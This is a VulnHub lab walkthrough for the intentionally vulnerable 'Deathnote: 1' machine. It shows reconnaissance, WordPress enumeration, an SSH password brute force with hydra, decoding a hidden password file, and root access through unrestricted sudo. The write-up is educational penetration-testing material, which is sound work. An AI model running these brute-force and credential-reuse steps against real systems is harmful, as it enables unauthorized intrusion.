# Deathnote: 1 — VulnHub Walkthrough

> **Machine:** Deathnote: 1  
> **Author:** HWKDS  
> **Series:** Deathnote  
> **Release Date:** 4 Sep 2021  
> **Difficulty:** Easy/Medium  
> **Target IP:** 10.0.2.6  
> **Attacker IP:** 10.0.2.3 (Kali)

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Finding Credentials](#3-finding-credentials)
4. [SSH Access as `l`](#4-ssh-access-as-l)
5. [Privilege Escalation to `kira`](#5-privilege-escalation-to-kira)
6. [Root Access](#6-root-access)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

### 1.1 Network Scan

```bash
sudo arp-scan --localnet
```

**Output:**
```
10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.2        08:00:27:b6:f1:92       (Unknown)
10.0.2.6        08:00:27:9f:80:d3       (Unknown)
```

Target identified: **10.0.2.6**

### 1.2 Port Scan

```bash
nmap -A 10.0.2.6
```

**Key Findings:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:9F:80:D3 (Oracle VirtualBox virtual NIC)
```

- **SSH** on port 22
- **HTTP** on port 80
- OS: Linux (Debian)

---

## 2. Web Enumeration

### 2.1 Add Host Entry

The WordPress site uses the hostname `deathnote.vuln`:

```bash
echo "10.0.2.6 deathnote.vuln" | sudo tee -a /etc/hosts
```

### 2.2 Directory Brute Force

```bash
gobuster dir -u http://10.0.2.6 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
```

**Interesting Findings:**
```
robots.txt           (Status: 200) [Size: 68]
wordpress            (Status: 301) [--> http://10.0.2.6/wordpress/]
```

### 2.3 robots.txt

```bash
curl http://10.0.2.6/robots.txt
```

*(Content is short — likely a hint or hidden path.)*

### 2.4 WordPress Site

Browse to `http://10.0.2.6/wordpress/`.

**Page source reveals:**
- Site title: **kira**
- Site description: "i am the god on new WORLD!!!"
- Navigation menu contains a **HINT** page:
  ```
  http://deathnote.vuln/wordpress/index.php/hint/
  ```
- Sidebar widget title: **"my fav line is iamjustic3"**
- Comment author: **L**

### 2.5 Hidden Hint File

The box author left a hint at `/important.jpg`:

```bash
wget http://10.0.2.6/important.jpg
file important.jpg
strings important.jpg
```

**Content reveals:**
```
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira
i can only help you by giving something important
login username : user.txt
i don't know the password.
find it by yourself 
but i think it is in the hint section of site
```

**Key takeaways:**
- SSH username is `user.txt` (i.e., `l`)
- Password is in the hint section of the site

---

## 3. Finding Credentials

### 3.1 Uploads Directory Listing

Browse to:
```
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/
```

**Directory listing reveals:**
```
[TXT] notes.txt   2021-07-19 10:08   449
[TXT] user.txt    2021-07-19 10:38    91
```

### 3.2 Download Dictionaries

```bash
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```

**Contents:**
```bash
cat user.txt
# l

cat notes.txt
# (password list, includes death4me)
```

### 3.3 SSH Brute Force with Hydra

```bash
hydra -L user.txt -P notes.txt ssh://10.0.2.6
```

**Result:**
```
[22][ssh] host: 10.0.2.6   login: l   password: death4me
```

---

## 4. SSH Access as `l`

### 4.1 Login

```bash
ssh l@10.0.2.6
# Password: death4me
```

### 4.2 Explore Home Directory

```bash
ls -la
cat user.txt
```

**`user.txt` contains Brainfuck code:**
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>...
```

**Decoded message (using CyberChef or online Brainfuck interpreter):**
```
i think u got the shell , but you wont be able to kill me -kira
```

### 4.3 System Enumeration

```bash
# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l
# Result: Sorry, user l may not run sudo on deathnote.

# Check /opt directory
ls -la /opt
```

**Output:**
```
drwxr-xr-x 3 root root 4096 Aug 29  2021 L
```

### 4.4 Explore `/opt/L`

```bash
cd /opt/L
ls -la
# fake-notebook-rule  kira-case

cd /opt/L/kira-case
cat case-file.txt
```

**`case-file.txt` content:**
```
the FBI agent died on December 27, 2006
1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family .
...
and we also found something in fake-notebook-rule folder .
```

### 4.5 The Key Directory

```bash
cd /opt/L/fake-notebook-rule
ls -la
# case.wav  hint

cat hint
# use cyberchef

cat case.wav
# (long hexadecimal string)
```

---

## 5. Privilege Escalation to `kira`

### 5.1 Decode `case.wav`

The file is **hex-encoded**. Decode using CyberChef with the following operations:

1. **From Hex**
2. **From Base64**

**Result:**
```
passwd : kiraisevil
```

### 5.2 Switch to `kira`

```bash
su kira
# Password: kiraisevil
```

### 5.3 Verify Access

```bash
cd /home/kira
ls -la
cat kira.txt
```

---

## 6. Root Access

### 6.1 Check Sudo Permissions

```bash
sudo -l
```

**Output:**
```
User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
```

### 6.2 Escalate to Root

```bash
sudo su -
```

### 6.3 Capture the Flag

```bash
cat /root/root.txt
```

**Output:**
```
      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: 
    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: 
   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         
  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   
 +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```

---

## 7. Summary

### 7.1 Attack Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Network scan (`arp-scan`) | Target: `10.0.2.6` |
| 2 | Port scan (`nmap -A`) | SSH (22), HTTP (80) |
| 3 | Directory brute force (`gobuster`) | `/wordpress/`, `robots.txt` |
| 4 | WordPress source inspection | HINT page, `iamjustic3` hint |
| 5 | `/important.jpg` inspection | Username `l`, password in hint |
| 6 | Uploads directory listing | `user.txt`, `notes.txt` |
| 7 | Hydra brute force | `l:death4me` |
| 8 | SSH login as `l` | Shell access |
| 9 | `/opt/L/fake-notebook-rule/` | `case.wav` + `hint` |
| 10 | CyberChef decode (Hex → Base64) | `kiraisevil` |
| 11 | `su kira` | Kira access |
| 12 | `sudo -l` → `sudo su -` | Root |
| 13 | `cat /root/root.txt` | Flag |

### 7.2 Vulnerabilities Identified

1. **Exposed credentials in WordPress source** — Hint text (`iamjustic3`) and username (`user.txt`) left in page source.
2. **Directory listing enabled** — `wp-content/uploads/2021/07/` exposed password dictionaries.
3. **Weak SSH password** — `l:death4me` found via dictionary attack.
4. **World-readable sensitive files** — `/opt/L/fake-notebook-rule/case.wav` readable by all users.
5. **Overly permissive sudo** — `kira` has `(ALL : ALL) ALL` without password restrictions.

### 7.3 Key Lessons

- **Always check page source** — comments, widget titles, and hidden links often contain credentials.
- **Enumerate upload directories** — WordPress upload folders frequently have directory listing enabled.
- **Use found dictionaries** — `user.txt` and `notes.txt` on the target are there for a reason.
- **Read hints carefully** — `/important.jpg` and `/opt/L/fake-notebook-rule/hint` point directly to the next step.
- **CyberChef is essential** — Hex → Base64 decoding is a common CTF pattern.

### 7.4 Tools Used

- `arp-scan`
- `nmap`
- `gobuster`
- `hydra`
- `wget`
- `curl`
- `CyberChef` (online or local)
- `ssh`

---

## 7.5 Cleanup

```bash
# Remove downloaded dictionaries
rm -f user.txt notes.txt important.jpg

# Remove hosts entry
sudo sed -i '/deathnote.vuln/d' /etc/hosts

# Revert VM snapshot (if applicable)
```

---

**Walkthrough by:** shrdx  
**Date:** 2026-11-17  
**Machine:** Deathnote: 1 (VulnHub)

---

> **Disclaimer:** This walkthrough is for educational purposes only. Always ensure you have permission to test any system.


---

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=800&size=28&duration=3000&pause=1000&color=00FF41&center=true&vCenter=true&width=550&lines=SHARAT+S+UNNITHAN;Rooted+Deathnote%3A+1+%F0%9F%92%80" />

<br/>

![Status](https://img.shields.io/badge/Status-Rooted-00FF41?style=for-the-badge&logo=gnubash&logoColor=black)
![Machine](https://img.shields.io/badge/Machine-Deathnote%3A%201-red?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge)

<br/>

**🖤 SHARAT S UNNITHAN 🖤**

<img src="https://capsule-render.vercel.app/api?type=waving&color=00FF41&height=100&section=footer" />

</div>

---
